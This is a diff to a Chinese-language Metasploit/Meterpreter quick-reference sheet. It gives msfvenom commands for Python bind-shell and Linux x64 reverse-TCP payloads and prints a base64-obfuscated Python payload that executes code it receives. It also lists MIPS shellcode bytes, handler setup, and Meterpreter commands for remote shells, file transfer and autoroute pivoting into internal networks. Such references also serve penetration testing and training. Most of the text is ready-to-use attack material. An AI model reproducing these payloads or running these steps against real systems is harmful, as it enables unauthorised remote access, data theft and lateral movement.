@@ -1,27 +1,40 @@
-# Meterpreter of Metasploit教程
+# Metasploit 与 Meterpreter 速查
 
-## 0x01 Backdoor生成
-使用MSF套件中msfvenom进行后门载荷的生成
+## 0x01 概述
+
+本篇用于记录 `msfvenom` 生成载荷、`msfconsole` 建立会话以及 `meterpreter` 常用命令。偏向查用速记，不展开模块原理。
+
+## 0x02 Payload 生成
+
+使用 MSF 套件中的 `msfvenom` 生成载荷。
+
 ### Meterpreter of Python
 
->-p 选择payload
->lport 监听端口
->-o 载荷生成位置
+- `-p`：选择 payload
+- `LPORT`：监听端口
+- `-o`：载荷输出位置
+
 ```
 msfvenom -p  python/meterpreter/bind_tcp lport=6666 -o /tmp/re111
 ```
-生成python文件如下:
+
+生成的 Python 文件内容示例：
+
 ```
 exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHpsaWIsYmFzZTY0LHNvY2tldCxzdHJ1Y3QKYj1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpiLmJpbmQoKCcwLjAuMC4wJyw4ODg4KSkKYi5saXN0ZW4oMSkKcyxhPWIuYWNjZXB0KCkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))
 ```
 
 ### Meterpreter of Linux X64
-反弹Shell
->LHOST(我方接收主机IP)192.168.1.1    
->LPORT(我方接收监听端口) 8888
+
+反弹 Shell 示例：
+
+- `LHOST`：我方接收主机 IP
+- `LPORT`：我方接收监听端口
+
 ```
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f elf > re111.elf
 ```
+
 ### Shellcode of Linux mipsle
 
 ```
@@ -46,12 +59,16 @@ buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
 buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
 buf += b"\x01\x01"
 ```
-## 0x02 漏洞利用（Exploit）
-使用MSF套件中msfconsole，启动
+
+## 0x03 监听与利用
+
+使用 MSF 套件中的 `msfconsole` 启动监听或利用模块。
+
 ```
 msfconsole
 ```
-### 通用的Backdoor会话管理模块
+
+### 通用会话管理模块
 
 ```
 msf6> use exploit/multi/handler
@@ -72,9 +89,11 @@ msf6 exploit(multi/handler) > run
 
 meterpreter >
 ```
-## 0x03 Meterpreter使用
+
+## 0x04 Meterpreter 常用命令
 
 ### 基本命令
+
 ```
 background   # 将当前会话放置后台
 sessions   # sessions –h 查看帮助
@@ -94,12 +113,16 @@ shell    # 进入目标机cmd shell
 ```
 
 ### 文件操作
-upload
+
+`upload`
+
 ```
 Usage: upload [options] src1 src2 src3 ... destination
 -r  Upload recursively
 ```
-downlaod
+
+`download`
+
 ```
 Usage: download [options] src1 src2 src3 ... destination
 
@@ -124,6 +147,12 @@ run get_local_subnets # 查看目标内网网段地址
 run autoroute -s 192.168.183.0/24  # 添加目标网段路由
 run autoroute -p  # 查看添加的路由
 ```
+
+## 0x05 注意事项
+
+- 先确认 payload 类型、监听模式和目标连接方式一致，否则 handler 很容易配错。
+- 生成载荷后，最好记录目标架构、平台、回连地址和端口，避免后续混淆。
+- `meterpreter` 功能多，但痕迹也明显，实战中要按需使用模块。
 
 ## Ref
 - https://xz.aliyun.com/t/6400
